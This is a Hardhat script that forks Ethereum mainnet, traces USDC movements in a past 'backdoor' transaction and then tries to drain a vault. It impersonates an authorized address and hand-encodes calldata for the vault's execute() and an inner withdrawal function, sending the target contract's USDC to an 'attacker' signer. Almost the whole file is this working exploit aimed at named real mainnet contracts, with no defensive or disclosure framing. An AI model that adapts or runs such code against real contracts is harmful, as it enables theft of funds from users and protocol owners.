const { ethers } = require("hardhat");

/**
 * @title Find Real USDC Holder
 * @notice Find where the USDC is actually stored
 * @dev The vault might use a proxy or escrow pattern
 */
async function main() {
  const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
  const AUTHORIZED_ADDRESS = "0x065e3DbaFCb2C26A978720f9eB4Bce6aD9D644a1";
  const TARGET_CONTRACT = "0x10a29ab757752e492abdbf6acba8f2ee10523599";
  const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
  
  const [attacker] = await ethers.getSigners();
  
  console.log("\n🔍 FINDING REAL USDC HOLDER");
  console.log("=====================================");
  
  const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
  const usdc = new ethers.Contract(USDC_ADDRESS, USDC_ABI, ethers.provider);
  
  // Check balances
  const vaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const targetBalance = await usdc.balanceOf(TARGET_CONTRACT);
  
  console.log("Vault USDC:", ethers.formatUnits(vaultBalance, 6));
  console.log("Target contract USDC:", ethers.formatUnits(targetBalance, 6));
  
  // The original backdoor transaction targeted the TARGET_CONTRACT
  // Let's analyze what that contract does
  console.log("\n📊 Analyzing original backdoor call...");
  console.log("The backdoor calls execute() on vault");
  console.log("Which then calls function 0xf4ff5295 on", TARGET_CONTRACT);
  
  // Let's trace where the USDC actually went in block 19178881
  console.log("\n🔎 Tracing USDC movement in backdoor block...");
  
  // Get the transaction receipt
  const backdoorTxHash = "0x7d826febd9a7e438bc133fa58dc4a4709bfa84fa35e4202d8aa285cf6d788276";
  
  try {
    // Fork at the exact block before the withdrawal
    await ethers.provider.send("hardhat_reset", [{
      forking: {
        jsonRpcUrl: process.env.ALCHEMY_MAINNET_URL,
        blockNumber: 19178880 // One block before
      }
    }]);
    
    console.log("Forked at block 19178880");
    
    // Check balances before withdrawal
    const vaultBefore = await usdc.balanceOf(VAULT_ADDRESS);
    const targetBefore = await usdc.balanceOf(TARGET_CONTRACT);
    
    console.log("\nBefore withdrawal:");
    console.log("Vault:", ethers.formatUnits(vaultBefore, 6));
    console.log("Target:", ethers.formatUnits(targetBefore, 6));
    
    // Move to next block
    await ethers.provider.send("hardhat_reset", [{
      forking: {
        jsonRpcUrl: process.env.ALCHEMY_MAINNET_URL,
        blockNumber: 19178881
      }
    }]);
    
    // Check after withdrawal
    const vaultAfter = await usdc.balanceOf(VAULT_ADDRESS);
    const targetAfter = await usdc.balanceOf(TARGET_CONTRACT);
    
    console.log("\nAfter withdrawal:");
    console.log("Vault:", ethers.formatUnits(vaultAfter, 6));
    console.log("Target:", ethers.formatUnits(targetAfter, 6));
    
    const vaultDiff = vaultBefore - vaultAfter;
    const targetDiff = targetBefore - targetAfter;
    
    console.log("\nChanges:");
    console.log("Vault:", ethers.formatUnits(vaultDiff, 6));
    console.log("Target:", ethers.formatUnits(targetDiff, 6));
    
  } catch (e) {
    console.log("Fork analysis error:", e.message);
  }
  
  // Reset to current fork
  await ethers.provider.send("hardhat_reset", [{
    forking: {
      jsonRpcUrl: process.env.ALCHEMY_MAINNET_URL,
      blockNumber: 19501107
    }
  }]);
  
  // Try the backdoor with the target contract pattern
  console.log("\n💣 EXPLOITING WITH PROPER TARGET...");
  
  await ethers.provider.send("hardhat_impersonateAccount", [AUTHORIZED_ADDRESS]);
  const authorized = await ethers.getSigner(AUTHORIZED_ADDRESS);
  
  // Check current balances
  const currentVaultBalance = await usdc.balanceOf(VAULT_ADDRESS);
  const currentTargetBalance = await usdc.balanceOf(TARGET_CONTRACT);
  
  console.log("\nCurrent balances:");
  console.log("Vault:", ethers.formatUnits(currentVaultBalance, 6));
  console.log("Target:", ethers.formatUnits(currentTargetBalance, 6));
  
  // If USDC is in the target contract, we need to use the inner function properly
  if (currentTargetBalance > 0) {
    console.log("\n✅ USDC found in target contract!");
    
    // The inner function parameters from original tx:
    // Param 1: 382868109133 - could be a nonce or ID
    // Param 2: 2436825607991045120 - amount (about 2.4M USDC)
    // Param 3: Large number - possibly encoded address/data
    // Param 4: 1e18 - standard decimals
    // Param 5: 1707339971 - timestamp
    // Param 6: Signature or verification data
    
    // Create exploit calldata
    const exploitAmount = currentTargetBalance;
    const currentTime = Math.floor(Date.now() / 1000);
    
    // Encode attacker address in param 3 format
    const encodedRecipient = "0x000000000000000000000000" + attacker.address.slice(2).toLowerCase() +
                             "0000000000000000000000000000000000000000";
    
    const innerData = "0xf4ff5295" +
      "0000000000000000000000000000000000000000000000000000000000000001" + // ID
      ethers.toBeHex(exploitAmount, 32).slice(2) + // Amount
      encodedRecipient.slice(2) + // Recipient encoded
      "0000000000000000000000000000000000000000000000000de0b6b3a7640000" + // 1e18
      ethers.toBeHex(currentTime, 32).slice(2) + // Current timestamp
      "0000000000000000000000000000000000000000000000000000000000000001"; // Minimal signature
    
    const vaultData = "0x78e111f6" +
      "000000000000000000000000" + TARGET_CONTRACT.slice(2).toLowerCase() +
      "0000000000000000000000000000000000000000000000000000000000000040" +
      ethers.toBeHex(innerData.length / 2 - 1, 32).slice(2) +
      innerData.slice(2);
    
    try {
      const exploitTx = await authorized.sendTransaction({
        to: VAULT_ADDRESS,
        data: vaultData,
        gasLimit: 1000000
      });
      
      const receipt = await exploitTx.wait();
      console.log("✅ Exploit transaction sent!");
      console.log("Tx hash:", exploitTx.hash);
      
      // Check for events
      const events = receipt.logs.filter(log => 
        log.address.toLowerCase() === USDC_ADDRESS.toLowerCase()
      );
      
      console.log("USDC events:", events.length);
      
    } catch (e) {
      console.log("Exploit error:", e.reason || e.message);
    }
  }
  
  // Check final balance
  const finalBalance = await usdc.balanceOf(attacker.address);
  console.log("\n💰 Final attacker balance:", ethers.formatUnits(finalBalance, 6), "USDC");
  
  await ethers.provider.send("hardhat_stopImpersonatingAccount", [AUTHORIZED_ADDRESS]);
  
  console.log("\n📊 CONCLUSION:");
  console.log("The USDC is likely held in the target contract", TARGET_CONTRACT);
  console.log("The inner function 0xf4ff5295 controls the withdrawal logic");
  console.log("Parameters need exact formatting to pass validation");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error("\n💥 Script error:", error);
    process.exit(1);
  });
